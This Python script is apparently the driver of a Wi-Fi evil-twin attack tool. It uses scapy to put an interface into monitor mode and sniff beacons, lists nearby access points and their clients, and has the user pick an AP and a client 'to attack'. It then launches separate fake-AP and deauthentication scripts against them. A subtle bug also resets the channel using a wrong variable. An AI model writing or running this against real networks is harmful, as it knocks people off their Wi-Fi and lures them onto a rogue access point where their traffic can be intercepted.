import os
import sys
from threading import *
import logging

from paramiko import channel


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt


global search_timeout
global interface
global ap_mac
global ap_name
global ap_channel
global client_mac
global client_list
ESSID = 0
BSSID = 1
CHANNEL = 2
ap_list = []
essids_set = set()

def monitorMode(a):
	os.system("ifconfig " + a + " down")
	os.system("iwconfig " + a + " mode monitor")
	os.system("ifconfig " + a + " up")


### In order to scan the network for multiple APs we need to check with each channel in the range [1,14].
def change_channel():
    channel_switch = 1
    while True:
        os.system('iwconfig %s channel %d' % (interface, channel_switch))
        channel_switch = channel_switch % 14 + 1
        time.sleep(0.5)


def ap_scan_pkt(pkt):
    # We are interested only in Beacon frame
    # Beacon frames are transmitted periodically, they serve to announce the presence of a wireless LAN
    if pkt.haslayer(Dot11Beacon):
        # Get the source MAC address - BSSID of the AP
        bssid = pkt[Dot11].addr2
        # Get the ESSID (name) of the AP
        essid = pkt[Dot11Elt].info.decode()
        # Check if the new found AP is already in the AP set
        if essid not in essids_set:
            essids_set.add(essid)
            # network_stats() function extracts some useful information from the network - such as the channel
            stats = pkt[Dot11Beacon].network_stats()
            # Get the channel of the AP
            channel = stats.get("channel")
            # Add the new found AP to the AP list
            ap_list.append([essid, bssid, channel])
            # print("AP name: %s,\t BSSID: %s,\t Channel: %d." % (essid, bssid, channel))

### sniff(..., prn = client_scan_pkt, ...)
### The argument 'prn' allows us to pass a function that executes with each packet sniffed
def client_scan_pkt(pkt):
    # We are interested in packets that send from the choosen AP to a client (not broadcast)
    # ff:ff:ff:ff:ff:ff - broadcast address
    if (pkt.addr2 == ap_mac or pkt.addr3 == ap_mac) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in client_list:
            if pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3:
                # Add the new found client to the client list
                client_list.append(pkt.addr1)
                print("Client with MAC address: " + pkt.addr1 + " was found.")

if __name__ == "__main__":

    empty = input("Press Enter to start ")
    os.system('ifconfig')
    interface = input("Enter interface name to put in monitor mode ")
    # Put the choosen interface in 'monitor mode'
    monitorMode(interface)

# ////////////////////////// step 2
    while(True):
        search_timeout = int(input( "Please enter number of seconds you want to scan AP's: "))
        channel_changer = Thread(target=change_channel)
        channel_changer.daemon = True
        channel_changer.start()
        print("\n Scanning........\n")
        # Sniffing packets - scanning the network for AP in the area
        # iface – the interface that is in monitor mode
        # prn – function to apply to each packet
        # timeout – stop sniffing after a given time
        sniff(iface=interface, prn=ap_scan_pkt, timeout=search_timeout)
        num_of_ap = len(ap_list)
        # If at least one AP was found, print all the found APs
        if num_of_ap > 0:
            # If at least 1 AP was found.
            print("\n ********* AP's ********* \n")
            for x in range(num_of_ap):
                print("[" + str(x) + "] BSSID: " + ap_list[x][BSSID] + "  Channel:" + str(ap_list[x][CHANNEL])
                      + "  AP name: " + ap_list[x][ESSID])
            # Choosing the AP to attack
            ap_index = int(input("Choose AP's number to attack:"))
            # Print the choosen AP
            print("Attack : [" + str(ap_index) + "] - BSSID: " + ap_list[ap_index][BSSID] + " Channel:" + str(
            ap_list[ap_index][CHANNEL]) + "  name: " + ap_list[ap_index][ESSID])
            # Set the channel as the choosen AP channel in order to send packets to connected clients later
            os.system('iwconfig %s channel %d' % (interface, (int(ap_list[ap_index][CHANNEL]))))
            # Save all the needed information about the choosen AP
            os.system('iwconfig %s channel %d' % (interface, channel))
            ap_mac = ap_list[ap_index][BSSID]
            ap_name = ap_list[ap_index][ESSID]
            ap_channel = ap_list[ap_index][CHANNEL]
            break
        else:
            # If no AP was found.
            rescan = input("No networks were found. Do you want to rescan? [Y/n] ")
            if rescan == "n":
                sys.exit(0)
    # ////////////////////////// step 3
    while(True):
        s_timeout = search_timeout * 2
        print( "\nScanning for clients that connected to: " + ap_name + " ...")
        sniff(iface=interface, prn=client_scan_pkt, timeout=s_timeout)
        num_of_client = len(client_list)
        # If at least one client was found, print all the found clients
        if num_of_client > 0:
        # If at least 1 client was found.
            print("\n*************** Clients Table ***************\n")
            for x in range(num_of_client):
                print("[" + str(x) + "] - " + client_list[x])

            # Choosing the AP to attack
            client_index = input("Choose client's number you want to attack:")
            if client_index.isnumeric():
                print("You choose the client: [" + client_index + "] - " + client_list[int(client_index)])
                # Save the needed information about the choosen client
                client_mac = client_list[int(client_index)]
                break
        else:
            rescan = input("No clients were found. Do you want to rescan? [Y/n] ")
            if rescan == "n":
                sys.exit(0)

    print("'Ctrl+C' to stop sending the packets. \n")
    empty = input (" Enter to start sending the Deauthentication packets.")
    os.system('gnome-terminal -- sh -c "python3 fake_ap.py "' +  ap_name)
    os.system('python3 Deauthentication.py ' + client_mac + ' ' + ap_mac + ' ' + interface)
